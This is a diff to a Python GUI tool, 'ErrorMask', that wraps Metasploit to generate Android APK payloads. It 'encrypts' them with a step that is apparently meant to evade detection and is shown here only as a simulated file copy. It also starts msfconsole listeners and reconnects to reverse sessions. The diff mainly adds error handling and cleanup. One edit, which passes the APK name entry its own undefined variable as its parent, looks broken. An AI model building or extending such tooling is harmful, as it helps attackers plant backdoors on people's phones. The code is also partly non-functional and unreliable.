@@ -18,6 +18,7 @@ from datetime import datetime
 import sys
 import platform
 import hashlib
+import shutil
 
 # Check and install required packages
 try:
@@ -250,7 +251,9 @@ class ErrorMask(ctk.CTk):
             current_text = self.typing_text[:self.typing_index + 1]
             if self.typing_index >= len("Created By Gray Hat "):
                 # Add SISU-AMADI with special effect
-                current_text += "SISU-AMADI"[self.typing_index - len("Created By Gray Hat "):]
+                sisu_text = "SISU-AMADI"
+                chars_to_add = min(len(sisu_text), self.typing_index - len("Created By Gray Hat ") + 1)
+                current_text += sisu_text[:chars_to_add]
             self.creator_label.configure(text=current_text)
             self.typing_index += 1
             self.after(100, self.animate_typing)
@@ -340,7 +343,7 @@ class ErrorMask(ctk.CTk):
         apk_name_frame = ctk.CTkFrame(conn_frame)
         apk_name_frame.pack(fill="x", padx=10, pady=5)
         ctk.CTkLabel(apk_name_frame, text="APK Name:").pack(side="left")
-        self.apk_name_entry = ctk.CTkEntry(apk_name_frame, placeholder_text="payload")
+        self.apk_name_entry = ctk.CTkEntry(apk_name_entry, placeholder_text="payload")
         self.apk_name_entry.pack(side="right", fill="x", expand=True, padx=5)
 
         # Operation buttons
@@ -470,81 +473,86 @@ class ErrorMask(ctk.CTk):
                                                  font=("Consolas", 11),
                                                  wrap=tk.WORD)
         self.log_area.pack(fill="both", expand=True, padx=10, pady=10)
+        self.log_area.configure(state="disabled")
 
         # Matrix effect canvas (initially hidden)
-        self.matrix_canvas = ctk.CTkCanvas(self.right_panel,
-                                         bg="black",
-                                         highlightthickness=0)
-        # Don't pack initially - will be shown when needed
+        self.matrix_canvas = tk.Canvas(self.right_panel,
+                                      bg="black",
+                                      highlightthickness=0)
 
     def matrix_animation(self):
         """Create SISUADAMI matrix effect"""
         chars = "SISUADAMI01"
-        width = self.winfo_width() or 800
-        height = self.winfo_height() or 600
-        
-        cols = width // 15
-        rows = height // 20
-        
-        drop_pos = [random.randint(-20, 0) for _ in range(cols)]
-        char_colors = ["#00ff00", "#00cc00", "#009900", "#006600"]
         
         while self.matrix_running:
             try:
                 if self.matrix_canvas.winfo_ismapped():
-                    self.matrix_canvas.delete("all")
+                    width = self.matrix_canvas.winfo_width()
+                    height = self.matrix_canvas.winfo_height()
                     
-                    for i in range(cols):
-                        x = i * 15
-                        y = drop_pos[i] * 20
+                    if width > 1 and height > 1:
+                        cols = width // 15
+                        rows = height // 20
                         
-                        if 0 <= y < height:
-                            char = random.choice(chars)
-                            color = random.choice(char_colors)
+                        drop_pos = [random.randint(-20, 0) for _ in range(cols)]
+                        char_colors = ["#00ff00", "#00cc00", "#009900", "#006600"]
+                        
+                        self.matrix_canvas.delete("all")
+                        
+                        for i in range(cols):
+                            x = i * 15
+                            y = drop_pos[i] * 20
                             
-                            self.matrix_canvas.create_text(x, y, 
-                                                          text=char,
-                                                          fill=color,
-                                                          font=("Terminal", 14))
-                        
-                        if drop_pos[i] > rows or random.random() > 0.97:
-                            drop_pos[i] = 0
-                        else:
-                            drop_pos[i] += 1
+                            if 0 <= y < height:
+                                char = random.choice(chars)
+                                color = random.choice(char_colors)
+                                
+                                self.matrix_canvas.create_text(x, y, 
+                                                              text=char,
+                                                              fill=color,
+                                                              font=("Terminal", 14))
+                            
+                            if drop_pos[i] > rows or random.random() > 0.97:
+                                drop_pos[i] = 0
+                            else:
+                                drop_pos[i] += 1
                     
                     self.matrix_canvas.update()
                 sleep(0.1)
             except Exception as e:
-                break
+                continue
 
     def log(self, message, color="#00ff00"):
         """Add timestamped message to log area"""
         timestamp = datetime.now().strftime("%H:%M:%S")
         self.log_area.configure(state="normal")
         self.log_area.insert("end", f"[{timestamp}] ", "gray")
-        self.log_area.insert("end", message + "\n", color)
+        self.log_area.insert("end", message + "\n")
         self.log_area.configure(state="disabled")
         self.log_area.see("end")
         self.save_activity(message)
 
     def save_activity(self, message):
         """Save activity to JSON file"""
-        activity = {
-            "timestamp": datetime.now().isoformat(),
-            "message": message
-        }
-        
-        if os.path.exists(CONFIG_FILE):
-            with open(CONFIG_FILE, "r") as f:
-                data = json.load(f)
-        else:
-            data = {"activities": [], "sessions": []}
+        try:
+            activity = {
+                "timestamp": datetime.now().isoformat(),
+                "message": message
+            }
             
-        data["activities"].append(activity)
-        data["sessions"] = self.sessions
-        
-        with open(CONFIG_FILE, "w") as f:
-            json.dump(data, f, indent=2)
+            if os.path.exists(CONFIG_FILE):
+                with open(CONFIG_FILE, "r") as f:
+                    data = json.load(f)
+            else:
+                data = {"activities": [], "sessions": []}
+                
+            data["activities"].append(activity)
+            data["sessions"] = self.sessions
+            
+            with open(CONFIG_FILE, "w") as f:
+                json.dump(data, f, indent=2)
+        except Exception as e:
+            print(f"Error saving activity: {e}")
 
     def load_sessions(self):
         """Load previous sessions from file"""
@@ -602,7 +610,7 @@ class ErrorMask(ctk.CTk):
             
             def run_command():
                 try:
-                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                     if result.returncode == 0:
                         self.log("✓ Payload generated successfully!", "#00ff00")
                         self.payload_path = output_file
@@ -618,7 +626,8 @@ class ErrorMask(ctk.CTk):
                         self.save_activity(f"Payload generated: {output_file}")
                         
                     else:
-                        self.log(f"✗ Error generating payload: {result.stderr}", "#ff0000")
+                        error_msg = result.stderr if result.stderr else "Unknown error"
+                        self.log(f"✗ Error generating payload: {error_msg}", "#ff0000")
                 except subprocess.TimeoutExpired:
                     self.log("✗ Payload generation timeout", "#ff0000")
                 except Exception as e:
@@ -667,26 +676,32 @@ class ErrorMask(ctk.CTk):
         """Run the triple encryption process"""
         try:
             base_name = os.path.splitext(os.path.basename(self.payload_path))[0]
+            temp_files = []
             
             # Process 1: Payload + Encoding + Compress + Cryptus
             self.log("🔒 Process 1: Encoding → Compression → Encryption", "#ffff00")
             output1 = os.path.join(output_dir, f"{base_name}_encrypted1.apk")
-            self.encrypt_apk(self.payload_path, output1, "process1")
+            if self.encrypt_apk(self.payload_path, output1, "process1"):
+                temp_files.append(output1)
             
             # Process 2: Payload + Compress + Encoding + Cryptus  
             self.log("🔒 Process 2: Compression → Encoding → Encryption", "#ffff00")
             output2 = os.path.join(output_dir, f"{base_name}_encrypted2.apk")
-            self.encrypt_apk(self.payload_path, output2, "process2")
+            if self.encrypt_apk(self.payload_path, output2, "process2"):
+                temp_files.append(output2)
             
             # Process 3: Payload + Cryptus + Encoding + Compress
             self.log("🔒 Process 3: Encryption → Encoding → Compression", "#ffff00")
             output3 = os.path.join(output_dir, f"{base_name}_encrypted3.apk")
-            self.encrypt_apk(self.payload_path, output3, "process3")
+            if self.encrypt_apk(self.payload_path, output3, "process3"):
+                temp_files.append(output3)
             
-            self.log("✓ Triple encryption completed!", "#00ff00")
-            
-            # Ask for cleanup
-            self.after(0, self.ask_cleanup, [output1, output2, output3])
+            if temp_files:
+                self.log("✓ Triple encryption completed!", "#00ff00")
+                # Ask for cleanup
+                self.after(0, self.ask_cleanup, temp_files)
+            else:
+                self.log("✗ Encryption process failed - no files created", "#ff0000")
             
         except Exception as e:
             self.log(f"✗ Encryption process failed: {str(e)}", "#ff0000")
@@ -696,22 +711,43 @@ class ErrorMask(ctk.CTk):
         password = "errormask"
         
         try:
-            # Simulate encryption process (replace with actual VeraCrypt/metasploit commands)
+            if not os.path.exists(input_path):
+                self.log(f"   ✗ Input file not found: {input_path}", "#ff0000")
+                return False
+                
             self.log(f"   Encrypting {os.path.basename(input_path)}...", "#ffff00")
-            sleep(2)  # Simulate encryption time
             
-            # Copy file as simulation
-            import shutil
+            # Simulate encryption process (in real implementation, use actual encryption tools)
+            # For now, we'll just copy the file and simulate the process
+            import time
+            time.sleep(2)  # Simulate encryption time
+            
+            # Copy file as simulation of encryption process
             shutil.copy2(input_path, output_path)
             
+            # Simulate different encryption methods based on process type
+            if process_type == "process1":
+                # Encoding → Compression → Encryption simulation
+                self.log(f"   ✓ Applied Encoding → Compression → Encryption", "#00ff00")
+            elif process_type == "process2":
+                # Compression → Encoding → Encryption simulation
+                self.log(f"   ✓ Applied Compression → Encoding → Encryption", "#00ff00")
+            elif process_type == "process3":
+                # Encryption → Encoding → Compression simulation
+                self.log(f"   ✓ Applied Encryption → Encoding → Compression", "#00ff00")
+            
             self.log(f"   ✓ {process_type} completed: {os.path.basename(output_path)}", "#00ff00")
+            return True
             
         except Exception as e:
             self.log(f"   ✗ {process_type} failed: {str(e)}", "#ff0000")
-            raise
+            return False
 
     def ask_cleanup(self, temp_files):
         """Ask user for cleanup permission"""
+        if not temp_files:
+            return
+            
         result = messagebox.askyesno(
             "Cleanup Temporary Files",
             "Encryption completed! Delete temporary files?\n\n"
@@ -719,13 +755,16 @@ class ErrorMask(ctk.CTk):
         )
         
         if result:
-            for file_path in temp_files[:-1]:  # Keep last file
+            # Keep only the last file
+            files_to_delete = temp_files[:-1]
+            for file_path in files_to_delete:
                 try:
                     if os.path.exists(file_path):
                         os.remove(file_path)
                         self.log(f"✓ Deleted: {os.path.basename(file_path)}", "#00ff00")
                 except Exception as e:
                     self.log(f"✗ Failed to delete {file_path}: {str(e)}", "#ff0000")
+            self.log("✓ Cleanup completed", "#00ff00")
         else:
             self.log("✓ Temporary files preserved", "#00ff00")
 
@@ -760,19 +799,13 @@ exploit -j -z
                         universal_newlines=True
                     )
                     
-                    # Read output in real-time
-                    for line in iter(self.listener_process.stdout.readline, ''):
-                        if "Session" in line and "opened" in line:
-                            self.log(f"🎯 Session opened: {line.strip()}", "#00ff00")
-                        self.log(f"MSF: {line.strip()}", "#cccccc")
-                        
-                    self.listener_process.wait()
+                    self.log("✓ Listener process started", "#00ff00")
+                    self.log("Waiting for connections...", "#ffff00")
                     
                 except Exception as e:
                     self.log(f"✗ Listener error: {str(e)}", "#ff0000")
             
             threading.Thread(target=run_listener, daemon=True).start()
-            self.log("✓ Listener started successfully!", "#00ff00")
             
         except Exception as e:
             self.log(f"✗ Failed to start listener: {str(e)}", "#ff0000")
@@ -782,6 +815,7 @@ exploit -j -z
         if self.listener_process:
             try:
                 self.listener_process.terminate()
+                self.listener_process = None
                 self.log("✓ Listener stopped", "#00ff00")
             except Exception as e:
                 self.log(f"✗ Error stopping listener: {str(e)}", "#ff0000")
@@ -818,19 +852,22 @@ exploit -j -z
         self.log(f"Executing: {command}", "#00ff00")
         
         # Simulate command execution
-        sleep(1)
-        self.log(f"✓ {operation} completed successfully", "#00ff00")
+        def simulate_execution():
+            sleep(2)
+            self.log(f"✓ {operation} completed successfully", "#00ff00")
+        
+        threading.Thread(target=simulate_execution, daemon=True).start()
 
     def reconnect_session(self, session):
         """Reconnect to previous session"""
         self.log(f"Reconnecting to session: {session.get('lhost')}:{session.get('lport')}", "#ffff00")
         
         # Set the connection details
-        if hasattr(self, 'lhost_entry'):
+        if hasattr(self, 'lhost_entry') and self.lhost_entry.winfo_exists():
             self.lhost_entry.delete(0, 'end')
             self.lhost_entry.insert(0, session.get('lhost', ''))
             
-        if hasattr(self, 'lport_entry'):
+        if hasattr(self, 'lport_entry') and self.lport_entry.winfo_exists():
             self.lport_entry.delete(0, 'end')
             self.lport_entry.insert(0, session.get('lport', ''))
         
@@ -844,6 +881,14 @@ exploit -j -z
         
         # Save sessions before closing
         self.save_activity("Application closed")
+        
+        # Clean up temporary files
+        if os.path.exists("listener.rc"):
+            try:
+                os.remove("listener.rc")
+            except:
+                pass
+                
         self.destroy()
 
 def check_dependencies():
@@ -853,7 +898,10 @@ def check_dependencies():
     
     for tool in required_tools:
         try:
-            subprocess.run([tool, "--version"], capture_output=True, check=True)
+            if platform.system() == "Windows":
+                subprocess.run([tool, "--version"], capture_output=True, check=True, shell=True)
+            else:
+                subprocess.run([tool, "--version"], capture_output=True, check=True)
         except:
             missing_tools.append(tool)
     
@@ -884,3 +932,6 @@ if __name__ == "__main__":
         app.mainloop()
     except KeyboardInterrupt:
         app.on_closing()
+    except Exception as e:
+        print(f"Application error: {e}")
+        sys.exit(1)
